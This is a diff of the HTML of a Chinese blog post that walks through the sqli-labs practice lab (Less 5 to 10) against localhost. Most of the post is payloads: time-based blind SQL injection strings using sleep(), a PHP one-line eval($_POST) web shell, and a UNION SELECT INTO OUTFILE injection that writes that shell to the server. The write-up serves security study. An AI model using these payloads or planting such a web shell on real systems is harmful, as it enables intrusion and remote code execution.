@@ -605,7 +605,7 @@ http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli-labs/Less-5/
 <pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p><a href="https://imgchr.com/i/Dlglr9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dlglr9.png" alt="结果图"></a></p>
 <h2 id="二-less6"><a href="#二-less6" class="headerlink" title="二.less6"></a>二.less6</h2><p>同less5 ,只不过变成双引号闭合,把’改成”即可,其他地方相同</p>
 <h2 id="三-less7"><a href="#三-less7" class="headerlink" title="三.less7"></a>三.less7</h2><ul>
-<li>一句话木马<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?&gt;</span><span class="token shell-comment comment">#root是我设置的密码,可以随便改,必须用双引号括起来</span></code></pre>
+<li>一句话木马<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token shell-comment comment">#root是我设置的密码,可以随便改,必须用双引号括起来</span></code></pre>
 网页提示用out file来解决<br><a href="https://imgchr.com/i/Dl2BSU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dl2BSU.png" alt=""></a></li>
 <li>less7代码:  <pre><code>http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,'&lt;?php @eval($_POST["crow"]); ?&gt;' into outfile  'E:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\a.php' --+</code></pre>注意点  </li>
 <li>本关要构造’))才能形成正确闭合</li>
@@ -633,7 +633,7 @@ _schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))</code>
 <pre><code>If(ascii(substr((select username from users limit 0,1),
 1,1))=68,1,sleep(5))--+</code></pre></li>
 </ul>
-<h1 id="六-less10"><a href="#六-less10" class="headerlink" title="六.less10"></a>六.less10</h1><p>双引号的字符型注入,后面玩法后less5一样<br><a href="https://imgchr.com/i/DlRdHA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlRdHA.png" alt=""></a></p>
+<h2 id="六-less10"><a href="#六-less10" class="headerlink" title="六.less10"></a>六.less10</h2><p>双引号的字符型注入,后面玩法后less5一样<br><a href="https://imgchr.com/i/DlRdHA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlRdHA.png" alt=""></a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
